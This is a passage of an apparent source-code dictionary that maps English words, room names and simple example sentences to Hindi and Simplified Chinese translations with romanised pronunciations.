                "Chinese (Simplified)": "猜测 (Cāicè)"
            },
            "collect": {
                "Hindi": "संग्रह करना (Sangrah Karna)",
                "Chinese (Simplified)": "收集 (Shōují)"
            },
            "hype": {
                "Hindi": "उत्साह (Utsaah)",
                "Chinese (Simplified)": "炒作 (Chǎozuò)"
            },
            "impossible": {
                "Hindi": "असंभव (Asambhav)",
                "Chinese (Simplified)": "不可能 (Bù kěnéng)"
            },
            "possible": {
                "Hindi": "संभव (Sambhav)",
                "Chinese (Simplified)": "可能 (Kěnéng)"
            },
            "path": {
                "Hindi": "पथ (Path)",
                "Chinese (Simplified)": "路径 (Lùjìng)"
            },
            "bribe": {
                "Hindi": "घूस (Ghoos)",
                "Chinese (Simplified)": "贿赂 (Huìlù)"
            },
            "away": {
                "Hindi": "दूर (Door)",
                "Chinese (Simplified)": "远离 (Yuǎnlí)"
            },
            "nearby": {
                "Hindi": "आसपास (Aaspas)",
                "Chinese (Simplified)": "附近 (Fùjìn)"
            },
            "near": {
                "Hindi": "पास (Paas)",
                "Chinese (Simplified)": "靠近 (Kàojìn)"
            },
            "long": {
                "Hindi": "लंबा (Lamba)",
                "Chinese (Simplified)": "长 (Cháng)"
            },
            "alot": {
                "Hindi": "बहुत ज्यादा (Bahut Zyada)",
                "Chinese (Simplified)": "非常多 (Fēicháng duō)"
            },
            "lot": {
                "Hindi": "बहुत (Bahut)",
                "Chinese (Simplified)": "许多 (Xǔduō)"
            },
            "invest": {
                "Hindi": "निवेश करना (Nivesh Karna)",
                "Chinese (Simplified)": "投资 (Tóuzī)"
            },
            "investigate": {
                "Hindi": "जांच करना (Jaanch Karna)",
                "Chinese (Simplified)": "调查 (Diàochá)"
            },
            "skill": {
                "Hindi": "कौशल (Kaushal)",
                "Chinese (Simplified)": "技能 (Jìnéng)"
            },
            "price": {
                "Hindi": "मूल्य (Moolya)",
                "Chinese (Simplified)": "价格 (Jiàgé)"
            },
            "value": {
                "Hindi": "मूल्य (Moolya)",
                "Chinese (Simplified)": "价值 (Jiàzhí)"
            },
            "jackpot": {
                "Hindi": "बड़ी जीत (Badi Jeet)",
                "Chinese (Simplified)": "头奖 (Tóujiǎng)"
            },
            "rod": {
                "Hindi": "छड़ी (Chhadi)",
                "Chinese (Simplified)": "杆 (Gǎn)"
            },
            #Home Rooms names
            "basement": {
                "Hindi": "तहखाना (Tahkhana)",
                "Chinese (Simplified)": "地下室 (Dìxiàshì)"
            },
            "kitchen": {
                "Hindi": "रसोईघर (Rasoighar)",
                "Chinese (Simplified)": "厨房 (Chúfáng)"
            },
            "bedroom": {
                "Hindi": "शयनकक्ष (Shayankaksh)",
                "Chinese (Simplified)": "卧室 (Wòshì)"
            },
            "living room": {
                "Hindi": "बैठक कक्ष (Baithak Kaksh)",
                "Chinese (Simplified)": "客厅 (Kètīng)"
            },
            "bathroom": {
                "Hindi": "स्नानघर (Snaan Ghar)",
                "Chinese (Simplified)": "浴室 (Yùshì)"
            },
            "dining room": {
                "Hindi": "भोजन कक्ष (Bhojan Kaksh)",
                "Chinese (Simplified)": "餐厅 (Cāntīng)"
            },
            "garage": {
                "Hindi": "गेराज (Garage)",
                "Chinese (Simplified)": "车库 (Chēkù)"
            },
            "attic": {
                "Hindi": "अटारी (Atari)",
                "Chinese (Simplified)": "阁楼 (Gélóu)"
            },
            "hallway": {
                "Hindi": "गलियारा (Galiara)",
                "Chinese (Simplified)": "走廊 (Zǒuláng)"
            },
            "study room": {
                "Hindi": "पढ़ाई का कमरा (Padhai Ka Kamra)",
                "Chinese (Simplified)": "书房 (Shūfáng)"
            },
            "laundry room": {
                "Hindi": "धोबीघर (Dhobighar)",
                "Chinese (Simplified)": "洗衣房 (Xǐyīfáng)"
            },
            "balcony": {
                "Hindi": "बालकनी (Balkani)",
                "Chinese (Simplified)": "阳台 (Yángtái)"
            },
            "storage room": {
                "Hindi": "भंडारण कक्ष (Bhandaran Kaksh)",
                "Chinese (Simplified)": "储藏室 (Chǔcángshì)"
            },
            "pantry": {
                "Hindi": "रसदघर (Rasadh Ghar)",
                "Chinese (Simplified)": "食品储藏室 (Shípǐn chǔcáng shì)"
            },
            "porch": {
                "Hindi": "बरामदा (Baramda)",
                "Chinese (Simplified)": "门廊 (Ménláng)"
            },
            "roof": {
                "Hindi": "छत (Chhat)",
                "Chinese (Simplified)": "屋顶 (Wūdǐng)"
            },
            "garden": {
                "Hindi": "बगीचा (Bagicha)",
                "Chinese (Simplified)": "花园 (Huāyuán)"
            },
            "guest room": {
                "Hindi": "अतिथि कक्ष (Atithi Kaksh)",
                "Chinese (Simplified)": "客房 (Kèfáng)"
            },
            "guest": {
                "Hindi": "अतिथि (Atithi)",
                "Chinese (Simplified)": "客人 (Kèrén)"
            },
            "relation": {
                "Hindi": "संबंध (Sambandh)",
                "Chinese (Simplified)": "关系 (Guānxì)"
            },
            "feed": {
                "Hindi": "खिलाना (Khilaana)",
                "Chinese (Simplified)": "喂养 (Wèiyǎng)"
            },
            "down to earth": {
                "Hindi": "व्यवहारिक (Vyavaharik)",
                "Chinese (Simplified)": "脚踏实地 (Jiǎotà shídì)"
            },
            "intellectual": {
                "Hindi": "बौद्धिक (Bauddhik)",
                "Chinese (Simplified)": "知识分子 (Zhīshì fènzǐ)"
            },
            "graduate": {
                "Hindi": "स्नातक (Snatak)",
                "Chinese (Simplified)": "毕业生 (Bìyèshēng)"
            },
            "park": {
                "Hindi": "पार्क (Park)",
                "Chinese (Simplified)": "公园 (Gōngyuán)"
            },
            "lantern": {
                "Hindi": "लालटेन (Laaltein)",
                "Chinese (Simplified)": "灯笼 (Dēnglóng)"
            },
            "torch": {
                "Hindi": "मशाल (Mashaal)",
                "Chinese (Simplified)": "火炬 (Huǒjù)"
            },
            "debate": {
                "Hindi": "विवाद (Vivaad)",
                "Chinese (Simplified)": "辩论 (Biànlùn)"
            },
            "pocket": {
                "Hindi": "जेब (Jeb)",
                "Chinese (Simplified)": "口袋 (Kǒudài)"
            },
            "packet": {
                "Hindi": "पैकेट (Packet)",
                "Chinese (Simplified)": "小包 (Xiǎobāo)"
            },
            "swell": {
                "Hindi": "सूजना (Soojna)",
                "Chinese (Simplified)": "肿胀 (Zhǒngzhàng)"
            },
            "bite": {
                "Hindi": "काटना (Kaatna)",
                "Chinese (Simplified)": "咬 (Yǎo)"
            },
            "bought": {
                "Hindi": "खरीदा (Khareeda)",
                "Chinese (Simplified)": "买了 (Mǎile)"
            },
            "another": {
                "Hindi": "दूसरा (Doosra)",
                "Chinese (Simplified)": "另一个 (Lìng yīgè)"
            },
            "turtle": {
                "Hindi": "कछुआ (Kachhua)",
                "Chinese (Simplified)": "乌龟 (Wūguī)"
            },
            "buffalo": {
                "Hindi": "भैंस (Bhais)",
                "Chinese (Simplified)": "水牛 (Shuǐniú)"
            },
            "bull": {
                "Hindi": "सांड़ (Saand)",
                "Chinese (Simplified)": "公牛 (Gōngniú)"
            },
            "page": {
                "Hindi": "पृष्ठ (Prashth)",
                "Chinese (Simplified)": "页面 (Yèmiàn)"
            },
            "servant": {
                "Hindi": "नौकर (Naukar)",
                "Chinese (Simplified)": "仆人 (Púrén)"
            },
            "lazy": {
                "Hindi": "आलसी (Aalsi)",
                "Chinese (Simplified)": "懒惰 (Lǎnduò)"
            },
            "sea port": {
                "Hindi": "समुद्र बंदरगाह (Samudra Bandaragaah)",
                "Chinese (Simplified)": "海港 (Hǎigǎng)"
            },
            "follow": {
                "Hindi": "अनुसरण करना (Anusaran Karna)",
                "Chinese (Simplified)": "跟随 (Gēnsuí)"
            },
            "followers": {
                "Hindi": "अनुयायी (Anuyaayi)",
                "Chinese (Simplified)": "追随者 (Zhuīsuí zhě)"
            },
            "following": {
                "Hindi": "आगे (Aage)",
                "Chinese (Simplified)": "以下 (Yǐxià)"
            },
            "blind": {
                "Hindi": "अंधा (Andha)",
                "Chinese (Simplified)": "盲人 (Mángrén)"
            },
            "advice": {
                "Hindi": "सलाह (Salaah)",
                "Chinese (Simplified)": "建议 (Jiànyì)"
            },
            "recommend": {
                "Hindi": "सिफारिश करना (Sifaarish Karna)",
                "Chinese (Simplified)": "推荐 (Tuījiàn)"
            },
            "nor": {
                "Hindi": "और नहीं (Aur Nahin)",
                "Chinese (Simplified)": "也不 (Yě bù)"
            },
            "neither": {
                "Hindi": "न तो (Na To)",
                "Chinese (Simplified)": "既不 (Jì bù)"
            },
            "wedding": {
                "Hindi": "शादी (Shaadi)",
                "Chinese (Simplified)": "婚礼 (Hūnlǐ)"
            },
            "pure": {
                "Hindi": "शुद्ध (Shuddh)",
                "Chinese (Simplified)": "纯净 (Chúnjìng)"
            },
            "discovery": {
                "Hindi": "खोज (Khoj)",
                "Chinese (Simplified)": "发现 (Fāxiàn)"
            },
            "split": {
                "Hindi": "विभाजन (Vibhaajan)",
                "Chinese (Simplified)": "分裂 (Fēnliè)"
            },
            "beast": {
                "Hindi": "जानवर (Jaanwar)",
                "Chinese (Simplified)": "野兽 (Yěshòu)"
            },
            "parliament": {
                "Hindi": "संसद (Sansad)",
                "Chinese (Simplified)": "议会 (Yìhuì)"
            },
            "trauma": {
                "Hindi": "आघात (Aaghaat)",
                "Chinese (Simplified)": "创伤 (Chuāngshāng)"
            },
            "invisible": {
                "Hindi": "अदृश्य (Adrishya)",
                "Chinese (Simplified)": "隐形 (Yǐnxíng)"
            },
            "invincible": {
                "Hindi": "अजेय (Ajey)",
                "Chinese (Simplified)": "无敌 (Wúdí)"
            },
            "actual": {
                "Hindi": "वास्तविक (Vastavik)",
                "Chinese (Simplified)": "实际 (Shíjì)"
            },
            "expensive": {
                "Hindi": "महंगा (Mehnga)",
                "Chinese (Simplified)": "昂贵 (Ángguì)"
            },
            "cheap": {
                "Hindi": "सस्ता (Sasta)",
                "Chinese (Simplified)": "便宜 (Piányi)"
            },
            "regret": {
                "Hindi": "पछतावा (Pachhtaava)",
                "Chinese (Simplified)": "遗憾 (Yíhàn)"
            },
            "conflict": {
                "Hindi": "संघर्ष (Sangharsh)",
                "Chinese (Simplified)": "冲突 (Chōngtū)"
            },
            "development": {
                "Hindi": "विकास (Vikaas)",
                "Chinese (Simplified)": "发展 (Fāzhǎn)"
            },
            "handle": {
                "Hindi": "हैंडल (Handle)",
                "Chinese (Simplified)": "把手 (Bǎshǒu)"
            },
            "slave": {
                "Hindi": "गुलाम (Gulaam)",
                "Chinese (Simplified)": "奴隶 (Núlì)"
            },
            "handling": {
                "Hindi": "संपादन (Sampaadan)",
                "Chinese (Simplified)": "处理 (Chǔlǐ)"
            },
            "explode": {
                "Hindi": "विस्फोट करना (Visphot Karna)",
                "Chinese (Simplified)": "爆炸 (Bàozhà)"
            },
            "caste": {
                "Hindi": "जाति (Jaati)",
                "Chinese (Simplified)": "种姓 (Zhǒngxìng)"
            },
            "job": {
                "Hindi": "नौकरी (Naukri)",
                "Chinese (Simplified)": "工作 (Gōngzuò)"
            },
            "profession": {
                "Hindi": "पेशा (Pesha)",
                "Chinese (Simplified)": "职业 (Zhíyè)"
            },
            "everyone": {
                "Hindi": "हर कोई (Har Koi)",
                "Chinese (Simplified)": "每个人 (Měi gèrén)"
            },
            "he always speaks with confidence.": {
                "Hindi": "वह हमेशा आत्मविश्वास के साथ बोलता है। (Vah hamesha atmavishwas ke saath bolta hai.)",
                "Chinese (Simplified)": "他总是自信地说话。 (Tā zǒng shì zìxìn de shuōhuà.)"
            },
            "the cat jumped over the wall effortlessly.": {
                "Hindi": "बिल्ली ने दीवार के ऊपर आसानी से छलांग लगाई। (Billi ne deewar ke upar aasani se chhalang lagayi.)",
                "Chinese (Simplified)": "猫轻松地跳过了墙。 (Māo qīngsōng de tiàoguòle qiáng.)"
            },
            "this cake tastes better than it looks.": {
                "Hindi": "यह केक देखने से ज्यादा स्वादिष्ट है। (Yeh cake dekhne se zyada swadisht hai.)",
                "Chinese (Simplified)": "这个蛋糕吃起来比看起来更好。 (Zhège dàngāo chī qǐlái bǐ kàn qǐlái gèng hǎo.)"
            },
            "he reads a new book every month.": {
                "Hindi": "वह हर महीने एक नई किताब पढ़ता है। (Vah har mahine ek nayi kitaab padhta hai.)",
                "Chinese (Simplified)": "他每个月读一本新书。 (Tā měi gè yuè dú yī běn xīn shū.)"
            },
            "the sunrise was absolutely breathtaking.": {
                "Hindi": "सूर्योदय वाकई मनमोहक था। (Suryoday vaakai manmohak tha.)",
                "Chinese (Simplified)": "日出美得令人叹为观止。 (Rìchū měi de lìng rén tànwéi guānzhǐ.)"
            },
            "he practices the piano for hours daily.": {
                "Hindi": "वह रोज घंटों तक पियानो का अभ्यास करता है। (Vah roz ghanton tak piano ka abhyas karta hai.)",
                "Chinese (Simplified)": "他每天练习钢琴好几个小时。 (Tā měitiān liànxí gāngqín hǎo jǐ gè xiǎoshí.)"
            },
            "she paints landscapes in her free time.": {
                "Hindi": "वह अपने खाली समय में परिदृश्य पेंट करती है। (Vah apne khaali samay mein paridrishya paint karti hai.)",
                "Chinese (Simplified)": "她在空闲时间画风景画。 (Tā zài kòngxián shíjiān huà fēngjǐng huà.)"
            },
            "the dog wagged its tail happily.": {
                "Hindi": "कुत्ते ने खुशी से अपनी पूंछ हिलाई। (Kutte ne khushi se apni poonch hilayi.)",
                "Chinese (Simplified)": "狗高兴地摇着尾巴。 (Gǒu gāoxìng de yáozhe wěibā.)"
            },
            "he built this table from scratch.": {
                "Hindi": "उसने यह मेज शुरुआत से बनाई। (Usne yeh mej shuruaat se banayi.)",
                "Chinese (Simplified)": "他从零开始做了这张桌子。 (Tā cóng líng kāishǐ zuòle zhè zhāng zhuōzi.)"
            },
            "she writes poetry to express her emotions.": {
                "Hindi": "वह अपनी भावनाओं को व्यक्त करने के लिए कविता लिखती है। (Vah apni bhavnaon ko vyakt karne ke liye kavita likhti hai.)",
                "Chinese (Simplified)": "她通过写诗表达自己的情感。 (Tā tōngguò xiě shī biǎodá zìjǐ de qínggǎn.)"
            },
            "he solved the puzzle in just a few minutes.": {
                "Hindi": "उसने पहेली को कुछ ही मिनटों में हल कर लिया। (Usne paheli ko kuch hi minton mein hal kar liya.)",
                "Chinese (Simplified)": "他几分钟内就解决了这个谜题。 (Tā jǐ fēnzhōng nèi jiù jiějuéle zhège mí tí.)"
            },
            "the kids were excited to see the magician perform.": {
                "Hindi": "बच्चे जादूगर का प्रदर्शन देखकर उत्साहित थे। (Bacche jadugar ka pradarshan dekhkar utsahit the.)",
                "Chinese (Simplified)": "孩子们看到魔术师表演时很兴奋。 (Háizimen kàndào móshùshī biǎoyǎn shí hěn xīngfèn.)"
            },
            "she sang a beautiful song at the event.": {
                "Hindi": "उसने कार्यक्रम में एक खूबसूरत गाना गाया। (Usne karyakram mein ek khoobsurat gaana gaya.)",
                "Chinese (Simplified)": "她在活动上唱了一首美丽的歌。 (Tā zài huódòng shàng chàngle yī shǒu měilì de gē.)"
            },
            "the train arrived earlier than expected.": {
                "Hindi": "ट्रेन उम्मीद से पहले पहुंच गई। (Train umeed se pehle pahunch gayi.)",
                "Chinese (Simplified)": "火车比预期早到了。 (Huǒchē bǐ yùqí zǎo dàole.)"
            },
            "he is learning to bake delicious cakes.": {
                "Hindi": "वह स्वादिष्ट केक बनाना सीख रहा है। (Vah swadisht cake banana seekh raha hai.)",
                "Chinese (Simplified)": "他正在学习烘焙美味的蛋糕。 (Tā zhèngzài xuéxí hōngbèi měiwèi de dàngāo.)"
            },
            "they planted trees to make the area greener.": {
                "Hindi": "उन्होंने क्षेत्र को हरा-भरा बनाने के लिए पेड़ लगाए। (Unhone kshetra ko hara-bhara banane ke liye ped lagaye.)",
                "Chinese (Simplified)": "他们种树让这个地区更加绿色。 (Tāmen zhòngshù ràng zhège dìqū gèng jiā lǜsè.)"
            },
            "she saved enough money to buy a new laptop.": {
                "Hindi": "उसने नया लैपटॉप खरीदने के लिए पर्याप्त पैसे बचाए। (Usne naya laptop kharidne ke liye paryapt paise bachaaye.)",
                "Chinese (Simplified)": "她攒够了钱买了一台新笔记本电脑。 (Tā zǎn gòule qián mǎile yī tái xīn bǐjìběn diànnǎo.)"
            },
            "the fireworks lit up the night sky beautifully.": {
                "Hindi": "आतिशबाजी ने रात के आसमान को खूबसूरती से रोशन कर दिया। (Aatishbaazi ne raat ke aasmaan ko khoobsurti se roshan kar diya.)",
                "Chinese (Simplified)": "烟花美丽地点亮了夜空。 (Yānhuā měilì de diǎnliàngle yèkōng.)"
            },
            "he enjoys hiking in the mountains during weekends.": {
                "Hindi": "वह सप्ताहांत में पहाड़ों में ट्रेकिंग का आनंद लेता है। (Vah saptahant mein pahadon mein trekking ka anand leta hai.)",
                "Chinese (Simplified)": "他喜欢周末在山里徒步。 (Tā xǐhuān zhōumò zài shān lǐ túbù.)"
            },
            "the artist painted a masterpiece that amazed everyone.": {
                "Hindi": "कलाकार ने एक ऐसी कृति बनाई जिसने सभी को चकित कर दिया। (Kalakaar ne ek aisi kriti banayi jisne sabhi ko chakit kar diya.)",
                "Chinese (Simplified)": "艺术家创作了一件让所有人惊叹的杰作。 (Yìshùjiā chuàngzuòle yī jiàn ràng suǒyǒu rén jīngtàn de jiézuò.)"
            },
            "he gave a speech that inspired the audience.": {
                "Hindi": "उसने एक ऐसा भाषण दिया जिसने दर्शकों को प्रेरित किया। (Usne ek aisa bhaashan diya jisne darshakon ko prerit kiya.)",
                "Chinese (Simplified)": "他发表了一次鼓舞人心的演讲。 (Tā fābiǎole yīcì gǔwǔ rén xīn de yǎnjiǎng.)"
            },
            "the dog chased the ball across the park.": {
                "Hindi": "कुत्ते ने पार्क के उस पार गेंद का पीछा किया। (Kutte ne park ke us paar gend ka peecha kiya.)",
                "Chinese (Simplified)": "狗在公园里追着球跑。 (Gǒu zài gōngyuán lǐ zhuīzhe qiú pǎo.)"
            },
            "she opened the gift box and smiled brightly.": {
                "Hindi": "उसने गिफ्ट बॉक्स खोला और चमकते हुए मुस्कुराई। (Usne gift box khola aur chamakte hue muskuraayi.)",
                "Chinese (Simplified)": "她打开礼物盒，灿烂地笑了起来。 (Tā dǎkāi lǐwù hé, cànlàn de xiàole qǐlái.)"
            },
            "the scientist worked tirelessly on the new invention.": {
                "Hindi": "वैज्ञानिक ने नए आविष्कार पर अथक मेहनत की। (Vaigyanik ne naye avishkar par athak mehnat ki.)",
                "Chinese (Simplified)": "科学家不知疲倦地研究新发明。 (Kēxuéjiā bù zhī píjuàn de yánjiū xīn fāmíng.)"
            },
            "the children played happily in the rain.": {
                "Hindi": "बच्चे बारिश में खुशी से खेल रहे थे। (Bacche barish mein khushi se khel rahe the.)",
                "Chinese (Simplified)": "孩子们在雨中快乐地玩耍。 (Háizimen zài yǔ zhōng kuàilè de wánshuǎ.)"
            },
            "she learned to cook her favorite dish from her grandmother.": {
                "Hindi": "उसने अपनी दादी से अपना पसंदीदा व्यंजन बनाना सीखा। (Usne apni dadi se apna pasandida vyanjan banana seekha.)",
                "Chinese (Simplified)": "她从奶奶那里学会了做她最喜欢的菜。 (Tā cóng nǎinai nàlǐ xuéhuìle zuò tā zuì xǐhuān de cài.)"
            },
            "the sunrise over the mountains was breathtaking.": {
                "Hindi": "पहाड़ों पर सूर्योदय बेहद सुंदर था। (Pahadon par sooryoday behad sundar tha.)",
                "Chinese (Simplified)": "山上的日出令人叹为观止。 (Shānshàng de rìchū lìngrén tàn wéi guānzhǐ.)"
            },
            "he built a small treehouse in the backyard.": {
                "Hindi": "उसने पिछवाड़े में एक छोटा सा ट्रीहाउस बनाया। (Usne pichwade mein ek chhota sa treehouse banaya.)",
                "Chinese (Simplified)": "他在后院建了一个小树屋。 (Tā zài hòuyuàn jiànle yīgè xiǎo shùwū.)"
            },
            "the book was so interesting that she finished it in one day.": {
                "Hindi": "किताब इतनी रोचक थी कि उसने इसे एक दिन में खत्म कर दिया। (Kitab itni rochak thi ki usne ise ek din mein khatam kar diya.)",
                "Chinese (Simplified)": "这本书太有趣了，她一天就看完了。 (Zhè běn shū tài yǒuqùle, tā yītiān jiù kàn wánle.)"
            },
            "they danced together under the starry sky.": {
                "Hindi": "वे तारों से भरे आसमान के नीचे साथ में नाचे। (Ve taaron se bhare aasman ke neeche saath mein nache.)",
                "Chinese (Simplified)": "他们在星空下一起跳舞。 (Tāmen zài xīngkōng xià yīqǐ tiàowǔ.)"
            },
            "the old clock in the hallway still works perfectly.": {
                "Hindi": "हॉलवे में पुरानी घड़ी अभी भी पूरी तरह से काम करती है। (Hallway mein purani ghadi abhi bhi poori tarah se kaam karti hai.)",
                "Chinese (Simplified)": "走廊里的老钟仍然完美运转。 (Zǒuláng lǐ de lǎo zhōng réngrán wánměi yùnzhuǎn.)"
            },
            "he enjoys reading history books in his free time.": {
                "Hindi": "वह खाली समय में इतिहास की किताबें पढ़ना पसंद करता है। (Vah khaali samay mein itihaas ki kitabein padhna pasand karta hai.)",
                "Chinese (Simplified)": "他在空闲时间喜欢读历史书。 (Tā zài kòngxián shíjiān xǐhuān dú lìshǐ shū.)"
            },
            "the flowers in the garden bloom beautifully in spring.": {
                "Hindi": "बगीचे के फूल वसंत में खूबसूरती से खिलते हैं। (Bagiche ke phool vasant mein khoobsurti se khilte hain.)",
                "Chinese (Simplified)": "花园里的花在春天盛开得很美。 (Huāyuán lǐ de huā zài chūntiān shèngkāi dé hěn měi.)"
            },
            "the cat curled up by the fireplace to stay warm.": {
                "Hindi": "बिल्ली गर्म रहने के लिए चिमनी के पास गोल होकर बैठ गई। (Billi garm rehne ke liye chimney ke paas gol hokar baith gayi.)",
                "Chinese (Simplified)": "猫蜷缩在壁炉旁取暖。 (Māo quánsuō zài bìlú páng qǔnuǎn.)"
            },
            "she painted a picture of a beautiful sunset.": {
                "Hindi": "उसने एक सुंदर सूर्यास्त की तस्वीर बनाई। (Usne ek sundar sooryaast ki tasveer banayi.)",
                "Chinese (Simplified)": "她画了一幅美丽的日落画。 (Tā huàle yī fú měilì de rìluò huà.)"
            },
            "the little boy gave his mother a handmade card.": {
                "Hindi": "छोटे लड़के ने अपनी माँ को एक हाथ से बना कार्ड दिया। (Chhote ladke ne apni maa ko ek haath se bana card diya.)",
                "Chinese (Simplified)": "小男孩给了妈妈一张手工卡片。 (Xiǎo nánhái gěile māmā yī zhāng shǒugōng kǎpiàn.)"
            },
            "he started learning a new language last month.": {
                "Hindi": "उसने पिछले महीने एक नई भाषा सीखना शुरू किया। (Usne pichhle mahine ek nayi bhaasha seekhna shuru kiya.)",
                "Chinese (Simplified)": "他上个月开始学习一种新语言。 (Tā shàng gè yuè kāishǐ xuéxí yī zhǒng xīn yǔyán.)"
            },
            "the storm knocked down several trees in the neighborhood.": {
                "Hindi": "तूफान ने पड़ोस में कई पेड़ों को गिरा दिया। (Toofaan ne pados mein kai pedon ko gira diya.)",
                "Chinese (Simplified)": "风暴摧倒了附近的几棵树。 (Fēngbào cuī dǎole fùjìn de jǐ kē shù.)"
            },
            "the family gathered to celebrate the festival together.": {
                "Hindi": "परिवार त्योहार को एक साथ मनाने के लिए इकट्ठा हुआ। (Parivaar tyohaar ko ek saath manane ke liye ikattha hua.)",
                "Chinese (Simplified)": "一家人聚在一起庆祝节日。 (Yījiārén jù zài yīqǐ qìngzhù jiérì.)"
            },
            "he built a sandcastle on the beach with his friends.": {
                "Hindi": "उसने अपने दोस्तों के साथ समुद्र तट पर एक रेत का महल बनाया। (Usne apne doston ke saath samudra tat par ek ret ka mahal banaya.)",
                "Chinese (Simplified)": "他和朋友们在海滩上堆了一个沙堡。 (Tā hé péngyǒumen zài hǎitān shàng duīle yīgè shā bǎo.)"
            },
            "she wrote a heartfelt letter to her best friend.": {
                "Hindi": "उसने अपनी सबसे अच्छी दोस्त को एक भावुक पत्र लिखा। (Usne apni sabse acchi dost ko ek bhaavuk patra likha.)",
                "Chinese (Simplified)": "她给她最好的朋友写了一封真挚的信。 (Tā gěi tā zuì hǎo de péngyǒu xiěle yī fēng zhēnzhì de xìn.)"
            },
            "he discovered a hidden trail while exploring the forest.": {
                "Hindi": "उसने जंगल में खोजबीन करते हुए एक छिपा हुआ रास्ता खोजा। (Usne jangal mein khojbheen karte hue ek chhupa hua rasta khoja.)",
                "Chinese (Simplified)": "他在探索森林时发现了一条隐藏的小路。 (Tā zài tànsuǒ sēnlín shí fāxiànle yītiáo yǐncáng de xiǎolù.)"
            },
            "the dog wagged its tail happily when it saw its owner.": {
                "Hindi": "कुत्ते ने अपने मालिक को देखकर खुशी से अपनी पूंछ हिलाई। (Kutte ne apne maalik ko dekhkar khushi se apni poonch hilaai.)",
                "Chinese (Simplified)": "狗看到主人时高兴地摇着尾巴。 (Gǒu kàn dào zhǔrén shí gāoxìng de yáozhe wěibā.)"
            },
            "the students worked together to complete the science project.": {
                "Hindi": "छात्रों ने मिलकर विज्ञान परियोजना को पूरा किया। (Chhatron ne milkar vigyaan pariyojna ko poora kiya.)",
                "Chinese (Simplified)": "学生们一起合作完成了科学项目。 (Xuéshēngmen yīqǐ hézuò wánchéngle kēxué xiàngmù.)"
            },
            "a gentle breeze made the leaves rustle softly.": {
                "Hindi": "हल्की हवा ने पत्तों को धीरे-धीरे सरसराने दिया। (Halki hawa ne patton ko dheere-dheere sarsarane diya.)",
                "Chinese (Simplified)": "一阵微风轻轻地吹动了树叶。 (Yī zhèn wéifēng qīngqīng de chuīdòngle shùyè.)"
            },
            "she felt a sense of accomplishment after finishing her painting.": {
                "Hindi": "अपनी पेंटिंग खत्म करने के बाद उसे गर्व महसूस हुआ। (Apni painting khatam karne ke baad use garv mehsoos hua.)",
                "Chinese (Simplified)": "完成画作后，她感到了一种成就感。 (Wánchéng huàzuò hòu, tā gǎndàole yī zhǒng chéngjiù gǎn.)"
            },
            "the children built a snowman during the winter break.": {
                "Hindi": "बच्चों ने सर्दियों की छुट्टी में एक स्नोमैन बनाया। (Bachchon ne sardiyon ki chhutti mein ek snowman banaya.)",
                "Chinese (Simplified)": "孩子们在寒假期间堆了一个雪人。 (Háizimen zài hánjià qíjiān duīle yīgè xuěrén.)"
            },
            "the farmer planted seeds in the field at dawn.": {
                "Hindi": "किसान ने सुबह-सुबह खेत में बीज बोए। (Kisaan ne subah-subah khet mein beej boe.)",
                "Chinese (Simplified)": "农民在黎明时在田地里播种。 (Nóngmín zài límíng shí zài tiándì lǐ bōzhǒng.)"
            },
            "she smiled as she read the heartfelt note.": {
                "Hindi": "उसने दिल को छूने वाला नोट पढ़ते समय मुस्कुराई। (Usne dil ko chhoone wala note padhte samay muskurai.)",
                "Chinese (Simplified)": "她读到那封感人的便条时微笑了。 (Tā dú dào nà fēng gǎnrén de biàntiáo shí wéixiàole.)"
            },
            "the stars sparkled brightly in the night sky.": {
                "Hindi": "रात के आसमान में तारे चमक रहे थे। (Raat ke aasman mein taare chamak rahe the.)",
                "Chinese (Simplified)": "夜空中的星星闪闪发光。 (Yèkōng zhōng de xīngxīng shǎnshǎn fāguāng.)"
            },
            "they shared a laugh over an old memory.": {
                "Hindi": "उन्होंने एक पुरानी याद पर हंसकर समय बिताया। (Unhone ek purani yaad par hanskar samay bitaya.)",
                "Chinese (Simplified)": "他们一起回忆旧时光时笑了起来。 (Tāmen yīqǐ huíyì jiù shíguāng shí xiàole qǐlái.)"
            },
            "the museum showcased ancient artifacts from different cultures.": {
                "Hindi": "संग्रहालय ने विभिन्न संस्कृतियों की प्राचीन वस्तुएं प्रदर्शित कीं। (Sangrahalaya ne vibhinn sanskritiyon ki praacheen vastuyein pradarshit keen.)",
                "Chinese (Simplified)": "博物馆展示了来自不同文化的古代文物。 (Bówùguǎn zhǎnshìle láizì bùtóng wénhuà de gǔdài wénwù.)"
            },
            "the chef prepared a delicious meal for the guests.": {
                "Hindi": "शेफ ने मेहमानों के लिए एक स्वादिष्ट भोजन तैयार किया। (Chef ne mehmaanon ke liye ek swaadisht bhojan tayar kiya.)",
                "Chinese (Simplified)": "厨师为客人准备了一顿美味的饭菜。 (Chúshī wèi kèrén zhǔnbèile yī dùn měiwèi de fàncài.)"
            },
            "he took a deep breath before stepping on stage.": {
                "Hindi": "मंच पर कदम रखने से पहले उसने गहरी सांस ली। (Manch par kadam rakhne se pehle usne gahri saans li.)",
                "Chinese (Simplified)": "在上台之前，他深吸了一口气。 (Zài shàngtái zhīqián, tā shēn xīle yī kǒuqì.)"
            },
            "the young girl sang a song that touched everyone’s heart.": {
                "Hindi": "छोटी लड़की ने एक गीत गाया जिसने सबका दिल छू लिया। (Chhoti ladki ne ek geet gaya jisne sabka dil chhoo liya.)",
                "Chinese (Simplified)": "小女孩唱了一首动人的歌，感动了所有人。 (Xiǎo nǚhái chàngle yī shǒu dòngrén de gē, gǎndòngle suǒyǒu rén.)"
            },
            "the scientist made a groundbreaking discovery in her lab.": {
                "Hindi": "वैज्ञानिक ने अपनी प्रयोगशाला में एक क्रांतिकारी खोज की। (Vaigyanik ne apni prayogshala mein ek krantikari khoj ki.)",
                "Chinese (Simplified)": "科学家在她的实验室里有了突破性的发现。 (Kēxuéjiā zài tā de shíyànshì lǐ yǒule tūpò xìng de fāxiàn.)"
            },
            "the little boy dreamed of becoming an astronaut.": {
                "Hindi": "छोटा लड़का एक अंतरिक्ष यात्री बनने का सपना देखता था। (Chhota ladka ek antariksh yatri banne ka sapna dekhta tha.)",
                "Chinese (Simplified)": "小男孩梦想成为一名宇航员。 (Xiǎo nánhái mèngxiǎng chéngwéi yī míng yǔhángyuán.)"
            },
            "the artist sketched a beautiful portrait in just a few minutes.": {
                "Hindi": "कलाकार ने कुछ ही मिनटों में एक सुंदर चित्र बना दिया। (Kalakar ne kuch hi minute mein ek sundar chitra bana diya.)",
                "Chinese (Simplified)": "艺术家在几分钟内画出了一幅美丽的画像。 (Yìshùjiā zài jǐ fēnzhōng nèi huàchūle yī fú měilì de huàxiàng.)"
            },
